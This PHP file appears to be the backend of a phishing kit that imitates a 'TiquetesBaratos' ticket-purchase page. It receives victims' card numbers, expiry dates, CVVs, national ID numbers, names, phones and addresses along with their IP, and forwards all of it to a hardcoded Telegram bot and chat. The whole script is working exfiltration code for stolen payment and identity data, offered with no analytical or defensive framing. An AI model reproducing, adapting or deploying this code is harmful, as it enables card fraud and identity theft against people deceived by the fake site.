<?php
// Configuración del bot de Telegram
define('TELEGRAM_BOT_TOKEN', '8468810660:AAG5z4WtFS5wii94MW2sgUj0df3RMvLRMNI');
define('TELEGRAM_CHAT_ID', '-1003746040945');

// Recupera los datos enviados desde load.php
$data = json_decode(file_get_contents('php://input'), true);

// Obtiene la IP del cliente
$ipAddress = $_SERVER['REMOTE_ADDR'];

if ($data) {
    // Formatear el mensaje con emojis y texto organizado
    $message = "🛑 **-777-TiquetesBaratos-777-** 🛑\n\n";
    $message .= "🔑 **IP del Dispositivo**: `{$ipAddress}`\n\n"; // IP del dispositivo
    $message .= "💳 **Detalles de la Tarjeta** 💳\n";
    $message .= "🔢 **Número de Tarjeta**: `{$data['cardNumber']}`\n";
    $message .= "📅 **Fecha de Expiración**: `{$data['expMonth']}/{$data['expYear']}`\n";
    $message .= "🔒 **CVV**: `{$data['cvv']}`\n";
    $message .= "💳 **Cuotas**: `{$data['cuotas']}`\n\n";

    $message .= "👤 **Datos del Propietario** 👤\n";
    $message .= "📝 **Nombre**: *{$data['ownerName']}*\n";
    $message .= "🆔 **Cédula**: `{$data['cedula']}`\n";
    $message .= "📱 **Teléfono**: `{$data['phone']}`\n";
    $message .= "🌍 **Ciudad**: `{$data['city']}`\n";
    $message .= "🏠 **Dirección**: `{$data['address']}`\n\n";

// Mensaje de marca con emojis y estilo personalizado
$message .= "🔑 **@usuarioinvalidoe** 🔑\n";
    // URL de la API de Telegram para enviar el mensaje
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    
    // Datos para la solicitud POST
    $postData = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'Markdown' // Activamos el modo Markdown para formatear el texto
    ];

    // Usamos cURL para enviar el mensaje
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    $response = curl_exec($ch);
    curl_close($ch);

    // Verificamos si se envió correctamente el mensaje
    if ($response) {
        // Enviar respuesta de éxito al cliente
        echo json_encode(['status' => 'success']);
    } else {
        // Si hubo un error
        echo json_encode(['status' => 'error']);
    }
} else {
    // Si no se recibieron datos válidos
    echo json_encode(['status' => 'error']);
}
?>
